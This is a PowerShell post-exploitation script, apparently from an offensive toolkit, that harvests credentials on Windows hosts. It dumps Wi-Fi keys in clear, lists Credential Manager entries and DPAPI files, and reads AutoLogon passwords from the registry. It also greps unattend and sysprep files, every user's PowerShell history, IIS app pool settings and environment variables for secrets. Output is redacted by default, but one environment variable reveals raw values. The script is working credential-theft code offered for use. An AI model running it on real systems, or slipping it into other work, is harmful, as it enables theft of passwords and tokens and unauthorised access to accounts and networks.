# gather/windows/enum-credentials.ps1 — Credential harvesting from common stores
# Requires: Current user context (some items need admin)
# Read-only: YES
# Sensitive-output: YES — redacted by default; set BRJOTSKEL_REVEAL_SECRETS=1 to print raw material
# MITRE ATT&CK: T1555 — Credentials from Password Stores

$ErrorActionPreference = 'SilentlyContinue'
$RevealSecrets = $env:BRJOTSKEL_REVEAL_SECRETS -eq '1'

function Sec($n) { Write-Output "`n=== $n ===" }
function Run($c) { Write-Output "PS> $c"; Invoke-Expression $c }
function Protect-SecretLine {
    process {
        if ($RevealSecrets) { $_; return }
        ($_ -replace '(?i)(password\s*[=:]\s*)\S+', '$1<redacted>' `
           -replace '(?i)(token\s*[=:]\s*)\S+', '$1<redacted>' `
           -replace '(?i)(secret\s*[=:]\s*)\S+', '$1<redacted>' `
           -replace '(?i)(key\s*[=:]\s*)\S+', '$1<redacted>' `
           -replace '(?i)(key content\s*:\s*)\S+', '$1<redacted>' `
           -replace '(?i)(https?://[^:/]+:)[^@]+@', '$1<redacted>@')
    }
}
function Show-SecretValue($Label, $Value) {
    if ($RevealSecrets) { Write-Output "$Label$Value" }
    elseif ($null -ne $Value -and "$Value" -ne '') { Write-Output "$Label<redacted>" }
    else { Write-Output "$Label" }
}

Sec 'CREDENTIAL_COLLECTION_MODE'
Write-Output "Secret output: $(if ($RevealSecrets) { 'REVEAL enabled' } else { 'REDACTED; set BRJOTSKEL_REVEAL_SECRETS=1 to reveal raw values' })"

Sec 'CREDENTIAL_MANAGER'
Run 'cmdkey /list'

Sec 'WIFI_PROFILES'
$profiles = netsh wlan show profiles 2>$null | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[-1].Trim() }
foreach ($p in $profiles) {
    Write-Output "--- $p ---"
    if ($RevealSecrets) {
        netsh wlan show profile name="$p" key=clear 2>$null | Select-String "Key Content"
    } else {
        netsh wlan show profile name="$p" key=clear 2>$null | Select-String "Key Content" | ForEach-Object { $_.Line } | Protect-SecretLine
    }
}

Sec 'DPAPI_MASTER_KEYS'
$paths = @(
    "$env:APPDATA\Microsoft\Credentials",
    "$env:LOCALAPPDATA\Microsoft\Credentials",
    "$env:APPDATA\Microsoft\Protect"
)
foreach ($path in $paths) {
    if (Test-Path $path) {
        Write-Output "--- $path ---"
        Get-ChildItem $path -Recurse -Force 2>$null | Select-Object FullName, Length, LastWriteTime
    }
}

Sec 'UNATTEND_SYSPREP_FILES'
$unattendPaths = @(
    "C:\unattend.xml", "C:\Windows\Panther\unattend.xml",
    "C:\Windows\Panther\Unattend\unattend.xml",
    "C:\Windows\system32\sysprep\sysprep.xml",
    "C:\Windows\system32\sysprep\unattend.xml"
)
foreach ($f in $unattendPaths) {
    if (Test-Path $f) {
        Write-Output "[+] FOUND: $f"
        Select-String -Path $f -Pattern "Password|UserName|AdminPassword" 2>$null | ForEach-Object { $_.Line } | Protect-SecretLine
    }
}

Sec 'AUTOLOGON'
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
$autoUser = (Get-ItemProperty $regPath -Name "DefaultUserName" -ErrorAction SilentlyContinue).DefaultUserName
$autoPass = (Get-ItemProperty $regPath -Name "DefaultPassword" -ErrorAction SilentlyContinue).DefaultPassword
$autoDom = (Get-ItemProperty $regPath -Name "DefaultDomainName" -ErrorAction SilentlyContinue).DefaultDomainName
if ($autoUser) {
    if ($RevealSecrets) { Write-Output "[+] AutoLogon: $autoDom\$autoUser : $autoPass" }
    else { Write-Output "[+] AutoLogon: $autoDom\$autoUser : <redacted>" }
}

Sec 'POWERSHELL_HISTORY'
$users = Get-ChildItem "C:\Users" -Directory -Force 2>$null
foreach ($u in $users) {
    $hist = "$($u.FullName)\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path $hist) {
        Write-Output "--- $($u.Name) PS history (last 30) ---"
        Get-Content $hist -Tail 30 2>$null | Select-String -Pattern "pass|secret|token|key|cred|ConvertTo-SecureString" | ForEach-Object { $_.Line } | Protect-SecretLine
    }
}

Sec 'IIS_APP_POOL_CREDS'
if (Test-Path "$env:SystemRoot\system32\inetsrv\appcmd.exe") {
    & "$env:SystemRoot\system32\inetsrv\appcmd.exe" list apppool /text:* 2>$null | Select-String "userName|password" | ForEach-Object { $_.Line } | Protect-SecretLine
}

Sec 'SCHEDULED_TASK_CREDENTIALS'
Run 'schtasks /query /fo LIST /v | Select-String "TaskName|Run As User" | Select-Object -First 40'

Sec 'ENVIRONMENT_VARIABLES_SECRETS'
if ($RevealSecrets) {
    Run 'Get-ChildItem env: | Where-Object { $_.Name -match "pass|secret|token|key|api" -and $_.Name -notmatch "^Path$" } | Format-Table Name, Value'
} else {
    Run 'Get-ChildItem env: | Where-Object { $_.Name -match "pass|secret|token|key|api" -and $_.Name -notmatch "^Path$" } | Select-Object Name,@{Name="Value";Expression={"<redacted>"}} | Format-Table Name, Value'
}
